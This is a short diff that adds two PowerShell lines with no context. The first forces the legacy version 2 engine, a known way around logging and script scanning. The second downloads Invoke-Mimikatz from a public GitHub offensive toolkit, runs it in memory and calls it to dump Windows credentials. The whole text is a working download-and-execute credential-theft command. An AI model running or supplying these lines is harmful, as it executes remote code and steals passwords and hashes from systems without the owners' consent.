@@ -1,0 +1,2 @@
+powershell.exe -Version 2
+New-Module -Name Invoke-MimikatzModule -ScriptBlock {Invoke-Expression (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1');Export-ModuleMember -Function Invoke-Mimikatz;} | Import-Module; Invoke-Mimikatz
